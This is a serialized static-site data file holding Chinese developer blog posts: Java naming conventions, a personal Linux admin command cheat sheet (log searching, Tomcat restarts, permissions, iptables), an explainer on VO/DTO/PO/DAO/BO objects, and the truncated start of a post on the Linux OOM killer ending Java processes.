//...\n}\npublic interface targetclassaware{\n    //...\n}\npublic interface applicationcontextaware{\n    //...\n}\npublic interface messagesourceresolvable{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 2.2 抽象类命名规范\n\n抽象类(abstract class)是一种特殊的类，其命名与普通类的命名规范相当。一般地，为了将抽象类与普通类和接口做出区别，提高抽象类的可读性，在命名抽象类时，会以“abstract”/“base”作为类命的前缀。下面是编程中一些常规的命名示例：\n\npublic abstract class abstractrepository<t>{\n    //...\n}\npublic abstract class abstractcontroller{\n    //...\n}\npublic abstract class basedao<t,id>{\n    //...\n}\npublic abstract class abstractcommonservice<t>{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n以下是spring framework中常见的抽象类示例：\n\npublic abstract class abstractaspectjadvice{\n    //...\n}\npublic abstract class abstractsingletonproxyfactorybean{\n    //...\n}\npublic abstract class abstractbeanfactorypointcutadvisor{\n    //...\n}\npublic abstract class abstractcachingconfiguration{\n    //...\n}\npublic abstract class abstractcontextloaderinitializer{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 2.3 异常类命名规范\n\n异常类(exception class)也是类的一种，但与普通类命名不同的是，异常类在命名时需要使用“exception”作为其后缀。下面是常见的异常类命名示例：\n\npublic class filenotfoundexception{\n    //...\n}\npublic class useralreadyexistexception{\n    //...\n}\npublic class transactionexception{\n    //...\n}\npublic class classnotfoundexception{\n    //...\n}\npublic class illegalargumentexception{\n    //...\n}\npublic class indexoutofboundsexception{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n另外，在java中还有另外一类异常类，它们属于系统异常，这一类异常类的命名使用“error”作为其后缀，以区分exception(编码，环境，操作等异常)。下面是系统异常(非检查异常)的命名示例：\n\npublic abstract class virtualmachineerror{\n    //...\n}\npublic class stackoverflowerror{\n    //...\n}\npublic class outofmemoryerror{\n    //...\n}\npublic class illegalaccesserror{\n    //...\n}\npublic class noclassdeffounderror{\n    //...\n}\npublic class nosuchfielderror{\n    //...\n}\npublic class nosuchmethoderror{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 3.方法命名规范\n\n方法(method)命名时,其首字母应该小写，如果方法签名由多个单词组成，则从第二个单词起，使用驼峰命名法进行书写。一般地，在对方法进行命名时，通常采用动词/动词+名词的组合，下面是方法命名的一些常见示例。\n\n\n# 3.1 表述获取\n\n如果一个方法用于获取某个值，通常使用“get”作为其前缀，例如：\n\npublic string getusername(){\n    //...\n}\npublic list<integer> getuserids(){\n    //...\n}\npublic user getone(){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 3.2 表述查询\n\n如果方法需要通过查询或筛选的方式获取某个数据，通常使用“find”/“query”作为其前缀，例如：\n\npublic list<user> findone(integer id){\n    //...\n}\npublic list<integer> findall(){\n    //...\n} \npublic list<string> queryorders(){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 3.3 表述条件\n\n如果一个方法需要一些条件参数，则可以使用“by”/“with”等字符作为方法名中条件的连接符，例如：\n\npublic user findbyusername(string username){\n    //...\n}\npublic list<integer> getuseridswithstate(boolean state){\n    //...\n}\npublic list<user> findallbyusernameorderbyiddesc(string username){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 3.4 表述设置\n\n如果一个方法是要设置，插入，修改，删除等操作，应该将对应的动词(set,insert,update,delete)作为其名词的前缀，例如：\n\npublic void setname(string name){\n    //...\n}\npublic user insert(user user){\n    //...\n}\npublic void update(user user){\n    //...\n}\npublic void clearall(){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 3.5 其他规范\n\n如果一个方法用于获取某组数据的长度或数量，则该方法应该使用length或size命名；如果方法的返回值为布尔类型(boolean)，则该方法应该使用“is”或”has”作为前缀；如果方法用于将一种类型的数据转换为另一种数据数类型，则可以使用“to”作为前缀。下面是综合示例：\n\npublic long length(){\n    //...\n}\npublic int size(){\n    //...\n}\npublic boolean isopen(){\n    //...\n}\npublic boolean isnotempty(){\n    //...\n}\npublic boolean haslength(){\n    //...\n}\npublic set<integer> maptoset(map map){\n    //...\n}\npublic userdto convertto(user user){\n    //...\n}\npublic string tostring(object obj){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 4. 变量命名规范\n\n变量(variable)命名包括参数名称，成员变量和局部变量。变量命名通常以小写字母开头，如果变量名由多个单词构成，则从第二个单词起首字母需要大写，在变量命名过程中，不建议使用“_”作为前缀或者单词之间的分割符号。下面是一些常见的变量命名示例：\n\nprivate string nickname;\nprivate string mobilenumber;\nprivate long id;\nprivate string username;\nprivate long orderid;\nprivate long orderitemid;\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 5. 常量命名规范\n\n一般地，常量名称采用全部大写的英文单词书写，如果常量名称由多个单词组成，则单词之间统一使用“_”进行分割，下面是常量命名示例：\n\npublic static final string login_user_session_key = "current_login_user";\npublic static final int max_age_value = 120;\npublic static final int default_page_no = 1;\npublic static final long max_page_size = 1000;\npublic static final boolean has_license = false;\npublic static final boolean is_checked = false;\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 6. 枚举命名规范\n\n枚举(enum)类是一种特殊的类，其命名规范遵循普通类的命名约束条件，首字母大写，采用驼峰命名法；枚举类中定义的值的名称遵循常量的命名规范，且枚举值的名称需要与类名有一定的关联性，下面是枚举的一些示例：\n\npublic enum color{\n    red,yellow,blue,green,white;\n}\npublic enum physicalsize{\n    tiny,small,medium,large,huge,gigantic;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n下面是oracle java标准库中的一个示例：\n\npublic enum elementtype{\n    type,\n    field,\n    method,\n    parameter,\n    constructor,\n    local_variable,\n    annotation_type,\n    package,\n    type_parameter,\n    type_use;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 7. 其他命名规范\n\n\n# 7.1 数组\n\n在定义数组时，为了便于阅读，尽量保持以下的书写规范：\n\nint[] array = new int[10];\nint[] idarray ={1,2,3,4,5};\nstring[] namearray = {"first","yellow","big"}\n\npublic list<string> getnamebyid(integer[] ids){\n    //...\n}\n//或者\npublic list<string> getnamebyid(integer...ids){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 7.2 表述复数或者集合\n\n如果一个变量用于描述多个数据时，尽量使用单词的复数形式进行书写，例如：\n\ncollection<order> orders;\nint[] values;\nlist<item> items;\n\n\n1\n2\n3\n\n\n另外，如果表述的是一个map数据，则应使用“map”作为其后缀，例如：\n\nmap<string,user> usermap;\nmap<string,list<object>> listmap;\n\n\n1\n2\n\n\n\n# 7.3 泛型类\n\n在书写泛型类时，通常做以下的约定：\n\n * e表示element，通常用在集合中；\n * id用于表示对象的唯一标识符类型\n * t表示type(类型)，通常指代类；\n * k表示key(键),通常用于map中；\n * v表示value(值),通常用于map中，与k结对出现；\n * n表示number,通常用于表示数值类型；\n * ？表示不确定的java类型；\n * x用于表示异常；\n * u,s表示任意的类型。\n\n下面时泛型类的书写示例：\n\npublic class hashset<e> extends abstractset<e>{\n    //...\n}\npublic class hashmap<k,v> extends abstractmap<k,v>{\n    //...\n}\npublic class threadlocal<t>{\n    //...\n}\npublic interface functor<t,x extends throwable>{\n    t val() throws x;\n}\npublic class container<k,v>{\n    private k key;\n    private v value;\n    container(k key,v value){\n        this.key = key;\n        this.value = value;\n    }\n    //getter and setter ...\n}\n\npublic interface baserepository<t,id>{\n    t findbyid(id id);\n\n    void update(t t);\n\n    list<t> findbyids(id...ids);\n}\n\npublic static <t> list<t> methodname(class<t> clz){\n    list<t> datalist = getbyclz(clz);\n    return datalist;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 7.4 接口实现类\n\n为了便于阅读，在通常情况下，建议接口实现类使用“impl作为后缀”，不建议使用大写的“i”作为接口前缀，下面是接口和接口实现类的书写示例。\n\n推荐写法：\n\npublic interface orderservice{\n    //...\n}\npublic class orderserviceimpl implements orderservice{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n不建议的写法：\n\npublic interface iorderservice{\n    //...\n}\npublic class orderservice implements iorderservice{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 7.5 测试类和测试方法\n\n在项目中，测试类采用被测试业务模块名/被测试接口/被测试类+“test”的方法进行书写，测试类中的测试函数采用“test”+用例操作_状态的组合方式进行书写，例如：\n\npublic class userservicetest{\n\n    public void testfindbyusernameandpassword(){\n        //...\n    }\n\n    public void testusernameexist_notexist(){\n        //...\n    }\n\n    public void testdeletebyid_isok(){\n        //...\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 8 扩展：速记java开发中的各种o\n\n最后，通过一张表和图快速对java中的bo,dto,dao,po,pojo,vo之间的含义，区别以及联系进行梳理。\n\n名称     使用范围                                  解释说明\nbo     用于service,manager,business等业务相关类的命名   business object业务处理对象，主要作用是把业务逻辑封装成一个对象。\ndto    经过加工后的po对象，其内部属性可能增加或减少               data transfer\n                                             object数据传输对象，主要用于远程调用等需要大量传输数据的地方，例如，可以将一个或多个po类的部分或全部属性封装为dto进行传输\ndao    用于对数据库进行读写操作的类进行命名                    data access\n                                             object数据访问对象，主要用来封装对数据库的访问，通过dao可以将pojo持久化为po，也可以利用po封装出vo和dto\npo     bean,entity等类的命名                      persistant\n                                             object持久化对象，数据库表中的数据在java对象中的映射状态，可以简单的理解为一个po对象即为数据库表中的一条记录\npojo   pojo是do/dto/bo/vo的统称                  plain ordinary java object\n                                             简单java对象，它是一个简单的普通java对象，禁止将类命名为xxxxpojo\nvo     通常是视图控制层和模板引擎之间传递的数据对象                value object\n                                             值对象，主要用于视图层，视图控制器将视图层所需的属性封装成一个对象，然后用一个vo对象在视图控制器和视图之间进行数据传输。\nao     应用层对象                                 application object，在web层与service层之间抽象的复用对象模型，很少用。\n\n下面将通过一张图来理解上述几种o之间相互转换的关系：\n\n\n\n来源：https://www.ramostear.com/blog/2020/03/20/2vxdaqjq.html',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"linux自用命令",frontmatter:{title:"linux自用命令",date:"2020-03-26T00:00:00.000Z",tags:["linux"],categories:["规范 Standard"],isShowComments:!0,publish:!0},regularPath:"/views/specification/linux01.html",relativePath:"views/specification/linux01.md",key:"v-feb357d8",path:"/views/specification/linux01.html",headers:[{level:2,title:"工具",slug:"工具",normalizedTitle:"工具",charIndex:29},{level:2,title:"文件内容查找",slug:"文件内容查找",normalizedTitle:"文件内容查找",charIndex:35},{level:2,title:"根据pid查程序目录",slug:"根据pid查程序目录",normalizedTitle:"根据pid查程序目录",charIndex:45},{level:2,title:"Tomcat",slug:"tomcat",normalizedTitle:"tomcat",charIndex:59},{level:2,title:"权限",slug:"权限",normalizedTitle:"权限",charIndex:69},{level:2,title:"文件复制/移动/大小",slug:"文件复制-移动-大小",normalizedTitle:"文件复制/移动/大小",charIndex:75},{level:2,title:"上传下载",slug:"上传下载",normalizedTitle:"上传下载",charIndex:89},{level:2,title:"压缩解压",slug:"压缩解压",normalizedTitle:"压缩解压",charIndex:97},{level:2,title:"建立软链接",slug:"建立软链接",normalizedTitle:"建立软链接",charIndex:105},{level:2,title:"更改环境变量",slug:"更改环境变量",normalizedTitle:"更改环境变量",charIndex:114},{level:2,title:"端口/防火墙",slug:"端口-防火墙",normalizedTitle:"端口/防火墙",charIndex:124},{level:2,title:"禁IP",slug:"禁ip",normalizedTitle:"禁ip",charIndex:134}],excerpt:'<Boxx/>\n<p>工作中常用到的linux命令备份，方便查看。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n',headersStr:"工具 文件内容查找 根据pid查程序目录 Tomcat 权限 文件复制/移动/大小 上传下载 压缩解压 建立软链接 更改环境变量 端口/防火墙 禁IP",content:"工作中常用到的linux命令备份，方便查看。\n\n\n\n * 工具\n * 文件内容查找\n * 根据pid查程序目录\n * Tomcat\n * 权限\n * 文件复制/移动/大小\n * 上传下载\n * 压缩解压\n * 建立软链接\n * 更改环境变量\n * 端口/防火墙\n * 禁IP\n\n\n\n\n# 工具\n\n自我备份：Xshell + Xftp（已破解）\n\n\n# 文件内容查找\n\n# 查找文件夹下或某个文件包含某字符的所有文件\n# -r 是递归查找\n# -n 是显示行号\n# -C 5 显示file文件里匹配字串那行以及上下5行\n# -B 5 显示前5行\n# -A 5 显示后5行\n# --include '*.html' 指定后缀名\ngrep -rn \"message\" ./\n# 实时显示日志记录\ntail -100f a.log\n# tail和多个grep使用\ntail -100f a.log | grep --line-buffer aa | grep bb\n# 查找包含 2020 的 catalina.out文件所在的行\nfind ./ -name catalina.out | xargs grep 2020\n# grep之后，按行统计行数 wc -l\nfind ./ -name catalina.out | xargs grep 2020 | wc -l\n# 查看当前路径下各个目录大小(后面也可以跟指定目录)， -h 以K，M，G为单位，提高信息的可读性。\ndu -sh *\n# 查找当前目录下的大文件并倒叙排列\ndu -sh * | sort -nr | head \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 根据pid查程序目录\n\nps -ef | grep redis\n# root     14145     1  0 Jul08 ?        00:17:14 ./redis-server *:6379\nls -al /proc/14145/exe\n# lrwxrwxrwx. 1 root root 0 7月 31 05:10 /proc/14145/exe -> /usr/local/bin/redis-server\n\n\n1\n2\n3\n4\n\n\n\n# Tomcat\n\n# 查看tomcat是否启动，并查看tomcat端口号\nps -ef| grep tomcat\nsudo netstat -apn | grep 7507  \nnetstat –pan | grep XXXX  (此处XXXX为pid)\n# 重启tomcat\ncd /home/yx/server8.5.50/apache-tomcat-8.5.40/bin\nsh shutdown.sh\nsh startup.sh\n# 有时关闭服务操作不成功，强制删掉后台进程\nkill -9 7010\n# 实时查看tomcat运行日志\ncd /home/yx/server8.5.50/apache-tomcat-8.5.40/logs\ntail -f -n 500 catalina.out #查看日志，同样Ctrl+c退出\n# 清缓存\ncd /home/yx/server8.5.50/apache-tomcat-8.5.40/work\nrm -rf Catalina\n# 截取日志 （前提是 catalina.out 日志中的每行都是以日期格式开头的）\nsed -n '/^2012-05-15/,/^2012-05-16/p' catalina.out > catalina_20120515.out\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 权限\n\n#给文件的所有者加上 x 权限,即可使用:\nchmod   u+x   文件\n#查看文件权限\nls  -l   文件\n\n\n1\n2\n3\n4\n\n\n> 参考： 白小黑..\n\n\n# 文件复制/移动/大小\n\n#复制文件夹 -r\ncp -r a文件夹 b新文件夹\n#将/test1目录下的file1复制到/test3 目录，并将文件名改为file2\nmv /test1/file1 /test3/file2\n\n\n1\n2\n3\n4\n\n\n\n# 上传下载\n\nyum -y install lrzsz #安装\nrz #上传\nsz #下载\n\n\n1\n2\n3\n\n\n\n# 压缩解压\n\n#压缩指定文件夹为 tar.bz2\n[root@db phantomjs]# tar -cjf echarts-convert.tar.bz2 echarts-convert/\n#解压 tar.bz2\n[root@db yx_zb]# tar -xjvf echarts-convert.tar.bz2\n\n\n1\n2\n3\n4\n\n\n\n# 建立软链接\n\nln -s /usr/PhantomJS/phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/bin/phantomjs\n\n\n1\n\n\n\n# 更改环境变量\n\nvim /etc/profile #编辑\nsource /etc/profile #重启使环境变量生效\n\n\n1\n2\n\n\n\n# 端口/防火墙\n\nnetstat -ntlp   #查看当前所有tcp端口\nnetstat -ntulp |grep 80   #查看所有80端口使用情况\n\n#开放端口： 1.修改 /etc/sysconfig/iptables 文件\n# 2.如开放80端口,ACCEPT为开启、DROP为关闭\niptables -A INPUT -p tcp --dport 80 -j ACCEPT #当数据从外部进入服务器为目标端口\niptables -A OUTPUT -p tcp --sport 80 -j ACCEPT #数据从服务器出去\nservice iptables save #保证重启服务器后也不会失效\n\nservice iptables restart #改完后重启防火墙\n/sbin/iptables -L -n #查看开放的端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 禁IP\n\niptables -A INPUT -p tcp -s 192.168.1.2 -j DROP\n\n\n1\n",normalizedContent:"工作中常用到的linux命令备份，方便查看。\n\n\n\n * 工具\n * 文件内容查找\n * 根据pid查程序目录\n * tomcat\n * 权限\n * 文件复制/移动/大小\n * 上传下载\n * 压缩解压\n * 建立软链接\n * 更改环境变量\n * 端口/防火墙\n * 禁ip\n\n\n\n\n# 工具\n\n自我备份：xshell + xftp（已破解）\n\n\n# 文件内容查找\n\n# 查找文件夹下或某个文件包含某字符的所有文件\n# -r 是递归查找\n# -n 是显示行号\n# -c 5 显示file文件里匹配字串那行以及上下5行\n# -b 5 显示前5行\n# -a 5 显示后5行\n# --include '*.html' 指定后缀名\ngrep -rn \"message\" ./\n# 实时显示日志记录\ntail -100f a.log\n# tail和多个grep使用\ntail -100f a.log | grep --line-buffer aa | grep bb\n# 查找包含 2020 的 catalina.out文件所在的行\nfind ./ -name catalina.out | xargs grep 2020\n# grep之后，按行统计行数 wc -l\nfind ./ -name catalina.out | xargs grep 2020 | wc -l\n# 查看当前路径下各个目录大小(后面也可以跟指定目录)， -h 以k，m，g为单位，提高信息的可读性。\ndu -sh *\n# 查找当前目录下的大文件并倒叙排列\ndu -sh * | sort -nr | head \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 根据pid查程序目录\n\nps -ef | grep redis\n# root     14145     1  0 jul08 ?        00:17:14 ./redis-server *:6379\nls -al /proc/14145/exe\n# lrwxrwxrwx. 1 root root 0 7月 31 05:10 /proc/14145/exe -> /usr/local/bin/redis-server\n\n\n1\n2\n3\n4\n\n\n\n# tomcat\n\n# 查看tomcat是否启动，并查看tomcat端口号\nps -ef| grep tomcat\nsudo netstat -apn | grep 7507  \nnetstat –pan | grep xxxx  (此处xxxx为pid)\n# 重启tomcat\ncd /home/yx/server8.5.50/apache-tomcat-8.5.40/bin\nsh shutdown.sh\nsh startup.sh\n# 有时关闭服务操作不成功，强制删掉后台进程\nkill -9 7010\n# 实时查看tomcat运行日志\ncd /home/yx/server8.5.50/apache-tomcat-8.5.40/logs\ntail -f -n 500 catalina.out #查看日志，同样ctrl+c退出\n# 清缓存\ncd /home/yx/server8.5.50/apache-tomcat-8.5.40/work\nrm -rf catalina\n# 截取日志 （前提是 catalina.out 日志中的每行都是以日期格式开头的）\nsed -n '/^2012-05-15/,/^2012-05-16/p' catalina.out > catalina_20120515.out\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 权限\n\n#给文件的所有者加上 x 权限,即可使用:\nchmod   u+x   文件\n#查看文件权限\nls  -l   文件\n\n\n1\n2\n3\n4\n\n\n> 参考： 白小黑..\n\n\n# 文件复制/移动/大小\n\n#复制文件夹 -r\ncp -r a文件夹 b新文件夹\n#将/test1目录下的file1复制到/test3 目录，并将文件名改为file2\nmv /test1/file1 /test3/file2\n\n\n1\n2\n3\n4\n\n\n\n# 上传下载\n\nyum -y install lrzsz #安装\nrz #上传\nsz #下载\n\n\n1\n2\n3\n\n\n\n# 压缩解压\n\n#压缩指定文件夹为 tar.bz2\n[root@db phantomjs]# tar -cjf echarts-convert.tar.bz2 echarts-convert/\n#解压 tar.bz2\n[root@db yx_zb]# tar -xjvf echarts-convert.tar.bz2\n\n\n1\n2\n3\n4\n\n\n\n# 建立软链接\n\nln -s /usr/phantomjs/phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/bin/phantomjs\n\n\n1\n\n\n\n# 更改环境变量\n\nvim /etc/profile #编辑\nsource /etc/profile #重启使环境变量生效\n\n\n1\n2\n\n\n\n# 端口/防火墙\n\nnetstat -ntlp   #查看当前所有tcp端口\nnetstat -ntulp |grep 80   #查看所有80端口使用情况\n\n#开放端口： 1.修改 /etc/sysconfig/iptables 文件\n# 2.如开放80端口,accept为开启、drop为关闭\niptables -a input -p tcp --dport 80 -j accept #当数据从外部进入服务器为目标端口\niptables -a output -p tcp --sport 80 -j accept #数据从服务器出去\nservice iptables save #保证重启服务器后也不会失效\n\nservice iptables restart #改完后重启防火墙\n/sbin/iptables -l -n #查看开放的端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 禁ip\n\niptables -a input -p tcp -s 192.168.1.2 -j drop\n\n\n1\n",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{frontmatter:{},regularPath:"/views/specification/wildcard.html",relativePath:"views/specification/wildcard.md",key:"v-0022bf72",path:"/views/specification/wildcard.html",headersStr:null,content:" 1. 泛型中的通配符 T，E，K，V，？\n\n本质上这些个都是通配符，没啥区别，换成 A-Z 之间的任何一个 字母都可以。 通常情况下，T，E，K，V，？ 是这样约定的：\n\n * ？ 表示不确定的 java 类型\n * T (type) 表示具体的一个 java 类型\n * K V (key value) 分别代表 java 键值中的 Key Value\n * E (element) 代表 Element",normalizedContent:" 1. 泛型中的通配符 t，e，k，v，？\n\n本质上这些个都是通配符，没啥区别，换成 a-z 之间的任何一个 字母都可以。 通常情况下，t，e，k，v，？ 是这样约定的：\n\n * ？ 表示不确定的 java 类型\n * t (type) 表示具体的一个 java 类型\n * k v (key value) 分别代表 java 键值中的 key value\n * e (element) 代表 element",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"项目中的各种 O对象模型 到底是什么",frontmatter:{title:"项目中的各种 O对象模型 到底是什么",date:"2020-05-21T00:00:00.000Z",tags:["开发规范","Java"],categories:["规范 Standard"],isShowComments:!0},regularPath:"/views/specification/objectModel.html",relativePath:"views/specification/objectModel.md",key:"v-f3442b98",path:"/views/specification/objectModel.html",headers:[{level:2,title:"VO",slug:"vo",normalizedTitle:"vo",charIndex:9},{level:2,title:"DTO",slug:"dto",normalizedTitle:"dto",charIndex:39},{level:2,title:"PO",slug:"po",normalizedTitle:"po",charIndex:17},{level:2,title:"DAO",slug:"dao",normalizedTitle:"dao",charIndex:52},{level:2,title:"BO",slug:"bo",normalizedTitle:"bo",charIndex:21},{level:2,title:"规范",slug:"规范",normalizedTitle:"规范",charIndex:65}],excerpt:"<Boxx/>\n<p>简单介绍工作中各种VO, TO, PO, BO...</p>\n",headersStr:"VO DTO PO DAO BO 规范",content:"简单介绍工作中各种VO, TO, PO, BO...\n\n\n\n * VO\n * DTO\n * PO\n * DAO\n * BO\n * 规范\n\n\n\n\n# VO\n\nVO：值对象、视图对象\n\n项目中经常用到，主要对应界面显示的数据对象。\n\n在一个 web 页面中，一般用一个 VO 对象对应整个界面的值。\n\n\n# DTO\n\nDTO：Data Transfer Object 数据传输对象\n\n项目中较少用到，主要用于远程调用等需要大量传输对象的地方。\n\n比如我们一张表有 100 个字段，那么对应的 PO 就有 100 个属性。 但是我们界面上只要显示 10 个字段， 客户端用 webService 来获取数据，没有必要把整个 PO 对象传递到客户端， 这时我们就可以用只有这 10 个属性的 DTO 来传递结果到客户端，这样也不会暴露服务端表结构。到达客户端以后，如果用这个对象来对应界面显示，那此时它的身份就转为 VO\n\n\n# PO\n\nPO：persistant object 持久对象\n\n项目中经常用到，可以看成是与数据库中的表相映射的 java 对象。\n\n最简单的 PO 就是对应数据库中某个表中的一条记录，多个记录可以用 PO 的集合。PO 中应该不包含任何对数据库的操作。\n\n\n# DAO\n\nDAO：数据访问对象\n\n项目中经常用到，主要用来封装对数据库的访问。\n\n\n# BO\n\nBO：business object 业务对象\n\n项目中较少用到，封装业务逻辑的 java 对象，通过调用 DAO 方法，结合 PO，VO 进行业务操作。\n\n\n# 规范\n\n> 阿里巴巴 Java 开发手册中的 DO、DTO、BO、AO、VO、POJO 定义\n\n * 分层领域模型规约：\n\nDO（ Data Object）：与数据库表结构一一对应，通过 DAO 层向上传输数据源对象。\n\nDTO（ Data Transfer Object）：数据传输对象，Service 或 Manager 向外传输的对象。\n\nBO（ Business Object）：业务对象。 由 Service 层输出的封装业务逻辑的对象。\n\nAO（ Application Object）：应用对象。 在 Web 层与 Service 层之间抽象的复用对象模型，极为贴近展示层，复用度不高。\n\nVO（ View Object）：显示层对象，通常是 Web 向模板渲染引擎层传输的对象。\n\nPOJO（ Plain Ordinary Java Object）：在本手册中， POJO 专指只有 setter/getter/toString 的简单类，包括 DO/DTO/BO/VO 等。\n\nQuery：数据查询对象，各层接收上层的查询请求。 注意超过 2 个参数的查询封装，禁止使用 Map 类来传输。\n\n * 领域模型命名规约：\n\n数据对象：xxxDO，xxx 即为数据表名。\n\n数据传输对象：xxxDTO，xxx 为业务领域相关的名称。\n\n展示对象：xxxVO，xxx 一般为网页名称。\n\nPOJO 是 DO/DTO/BO/VO 的统称，禁止命名成 xxxPOJO。",normalizedContent:"简单介绍工作中各种vo, to, po, bo...\n\n\n\n * vo\n * dto\n * po\n * dao\n * bo\n * 规范\n\n\n\n\n# vo\n\nvo：值对象、视图对象\n\n项目中经常用到，主要对应界面显示的数据对象。\n\n在一个 web 页面中，一般用一个 vo 对象对应整个界面的值。\n\n\n# dto\n\ndto：data transfer object 数据传输对象\n\n项目中较少用到，主要用于远程调用等需要大量传输对象的地方。\n\n比如我们一张表有 100 个字段，那么对应的 po 就有 100 个属性。 但是我们界面上只要显示 10 个字段， 客户端用 webservice 来获取数据，没有必要把整个 po 对象传递到客户端， 这时我们就可以用只有这 10 个属性的 dto 来传递结果到客户端，这样也不会暴露服务端表结构。到达客户端以后，如果用这个对象来对应界面显示，那此时它的身份就转为 vo\n\n\n# po\n\npo：persistant object 持久对象\n\n项目中经常用到，可以看成是与数据库中的表相映射的 java 对象。\n\n最简单的 po 就是对应数据库中某个表中的一条记录，多个记录可以用 po 的集合。po 中应该不包含任何对数据库的操作。\n\n\n# dao\n\ndao：数据访问对象\n\n项目中经常用到，主要用来封装对数据库的访问。\n\n\n# bo\n\nbo：business object 业务对象\n\n项目中较少用到，封装业务逻辑的 java 对象，通过调用 dao 方法，结合 po，vo 进行业务操作。\n\n\n# 规范\n\n> 阿里巴巴 java 开发手册中的 do、dto、bo、ao、vo、pojo 定义\n\n * 分层领域模型规约：\n\ndo（ data object）：与数据库表结构一一对应，通过 dao 层向上传输数据源对象。\n\ndto（ data transfer object）：数据传输对象，service 或 manager 向外传输的对象。\n\nbo（ business object）：业务对象。 由 service 层输出的封装业务逻辑的对象。\n\nao（ application object）：应用对象。 在 web 层与 service 层之间抽象的复用对象模型，极为贴近展示层，复用度不高。\n\nvo（ view object）：显示层对象，通常是 web 向模板渲染引擎层传输的对象。\n\npojo（ plain ordinary java object）：在本手册中， pojo 专指只有 setter/getter/tostring 的简单类，包括 do/dto/bo/vo 等。\n\nquery：数据查询对象，各层接收上层的查询请求。 注意超过 2 个参数的查询封装，禁止使用 map 类来传输。\n\n * 领域模型命名规约：\n\n数据对象：xxxdo，xxx 即为数据表名。\n\n数据传输对象：xxxdto，xxx 为业务领域相关的名称。\n\n展示对象：xxxvo，xxx 一般为网页名称。\n\npojo 是 do/dto/bo/vo 的统称，禁止命名成 xxxpojo。",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Linux 系统内存不足导致 Java 进程被杀掉",frontmatter:{title:"Linux 系统内存不足导致 Java 进程被杀掉",date:"2023-01-12T00:00:00.000Z",tags:["linux"],categories:["规范 Standard"],isShowComments:!0,publish:!0},regularPath:"/views/specification/linux02.html",relativePath:"views/specification/linux02.md",key:"v-d3f9ff98",path:"/views/specification/linux02.html",headers:[{level:2,title:"问题排查",slug:"问题排查",normalizedTitle:"问题排查",charIndex:54},{level:2,title:"原因分析",slug:"原因分析",normalizedTitle:"原因分析",charIndex:62},{level:2,title:"解决方法",slug:"解决方法",normalizedTitle:"解决方法",charIndex:70}],excerpt:'<Boxx/>\n<p>查看java系统错误日志、gc日志都没有发现任何问题，服务器应用总是隔三岔五莫名其妙被停掉。。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n',headersStr:"问题排查 原因分析 解决方法",content:"查看java系统错误日志、gc日志都没有发现任何问题，服务器应用总是隔三岔五莫名其妙被停掉。。\n\n\n\n * 问题排查\n * 原因分析\n * 解决方法\n\n\n\nLinux内存使用量超过阈值，使得Java应用程序无可用内存，最终导致程序崩溃。即使在程序没有挂掉时把程序停掉，系统内存也不会被释放。\n\n\n# 问题排查\n\n查看 Linux 的系统日志 /var/log/message 出现如下日志，说明 Linux 系统自身把 Java 进程杀掉了\n\n# grep 'Out of memory' messages*\nDec 14 11:21:59 ecs-web kernel: Out of memory: Kill process 17873 (java) score 67 or sacrifice child\n\n\n1\n2\n\n\n当 Linux 系统内存不足时，系统会把当前系统占用系统内存过高的进程当做流氓进程，然后系统发出信号将这个流氓进程杀掉，最后导致 Java 